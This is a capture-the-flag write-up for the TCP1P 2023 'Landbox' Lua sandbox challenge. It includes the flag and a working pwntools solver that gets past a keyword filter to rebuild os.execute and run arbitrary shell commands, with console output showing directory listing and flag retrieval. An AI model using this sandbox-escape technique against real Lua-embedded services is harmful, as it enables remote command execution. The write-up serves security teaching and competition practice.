# Landbox

## Description

> who knew lua could be so troublesome.
>
> Attachment: main.lua, Dockerfile

## Flag

TCP1P{complex_problem_requires_simple_solution}

## Setup

```bash
echo dummy > flag.txt
docker build -t tcp1p/landbox . && docker run --rm --name landbox -p 1337:1337 -it tcp1p/landbox
```

## Solution

solver.py

```python
from pwn import *
import inspect


def conn() -> pwnlib.tubes:
    if args.REMOTE:
        HOST = "51.161.84.3"
        PORT = 26462
    else:
        HOST = "localhost"
        PORT = 1337

    io = remote(HOST, PORT)
    return io


# File write to /tmp/myfile.lua
def write_payload(cmd: str) -> str:
    payload = f"""
    local f=io.open("/tmp/myfile.lua", "wb")
    f:write([[ load(string.lower("OS.E") .. string.lower("XECUTE") .. "('{cmd}')")() ]])
    io.close(f)
    -- END
    """
    payload = inspect.cleandoc(payload)

    return payload


# Execute /tmp/myfile.lua
def execute_payload() -> str:
    payload = """
    f = assert(loadfile('/tmp/myfile.lua')); f();
    -- END
    """
    payload = inspect.cleandoc(payload)

    return payload


def main():
    cmd = args.CMD if args.CMD else "id"

    # 1st Step:
    with conn() as io:
        p1 = write_payload(cmd)
        io.sendlineafter(b"-- BEGIN", p1.encode())
        io.recvuntilS(b"-- OUTPUT END")

    # 2nd Step:
    with conn() as io:
        p2 = execute_payload()
        io.sendlineafter(b"-- BEGIN", p2.encode())
        log.info(io.recvuntilS(b"-- OUTPUT END"))


if __name__ == "__main__":
    main()
```

```console
root@kali:~/ctf/TCP1PCTF_2023/misc/Landbox# python3 solver.py REMOTE CMD="ls -la /"
[+] Opening connection to 51.161.84.3 on port 26462: Done
[*] Closed connection to 51.161.84.3 port 26462
[+] Opening connection to 51.161.84.3 on port 26462: Done
[*]

    -- OUTPUT BEGIN
    total 64
    drwxr-xr-x   1 root root 4096 Oct 16 07:56 .
    drwxr-xr-x   1 root root 4096 Oct 16 07:56 ..
    -rwxr-xr-x   1 root root    0 Oct 16 07:56 .dockerenv
    lrwxrwxrwx   1 root root    7 Jun 24 02:02 bin -> usr/bin
    drwxr-xr-x   2 root root 4096 Apr 18  2022 boot
    drwxr-xr-x   1 root root 4096 Oct  7 05:27 ctf
    drwxr-xr-x  14 root root 4320 Oct 16 07:56 dev
    drwxr-xr-x   1 root root 4096 Oct 16 07:56 etc
    -rwxr--r--   1 root root   47 Oct  7 05:25 flag-cd55f8dcbf9176753d5e91133c78e172.txt
    drwxr-xr-x   2 root root 4096 Apr 18  2022 home
    lrwxrwxrwx   1 root root    7 Jun 24 02:02 lib -> usr/lib
    lrwxrwxrwx   1 root root    9 Jun 24 02:02 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root    9 Jun 24 02:02 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root   10 Jun 24 02:02 libx32 -> usr/libx32
    drwxr-xr-x   2 root root 4096 Jun 24 02:02 media
    drwxr-xr-x   2 root root 4096 Jun 24 02:02 mnt
    drwxr-xr-x   2 root root 4096 Jun 24 02:02 opt
    dr-xr-xr-x 380 root root    0 Oct 16 07:56 proc
    drwx------   2 root root 4096 Jun 24 02:06 root
    drwxr-xr-x   5 root root 4096 Jun 24 02:06 run
    lrwxrwxrwx   1 root root    8 Jun 24 02:02 sbin -> usr/sbin
    drwxr-xr-x   2 root root 4096 Jun 24 02:02 srv
    dr-xr-xr-x  13 root root    0 Oct 16 07:56 sys
    drwxrwxrwt   1 root root 4096 Oct 16 07:57 tmp
    drwxr-xr-x   1 root root 4096 Jun 24 02:02 usr
    drwxr-xr-x   1 root root 4096 Jun 24 02:06 var
    -- OUTPUT END
[*] Closed connection to 51.161.84.3 port 26462

root@kali:~/ctf/TCP1PCTF_2023/misc/Landbox# python3 solver.py REMOTE CMD="cat /flag-cd55f8dcbf9176753d5e91133c78e172.txt"
[+] Opening connection to 51.161.84.3 on port 26462: Done
[*] Closed connection to 51.161.84.3 port 26462
[+] Opening connection to 51.161.84.3 on port 26462: Done
[*]

    -- OUTPUT BEGIN
    TCP1P{complex_problem_requires_simple_solution}-- OUTPUT END
[*] Closed connection to 51.161.84.3 port 26462
```

## References

- <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#lua-jails>
- <https://www.gammon.com.au/scripts/doc.php?general=lua_base>
- <https://gtfobins.github.io/gtfobins/lua/>
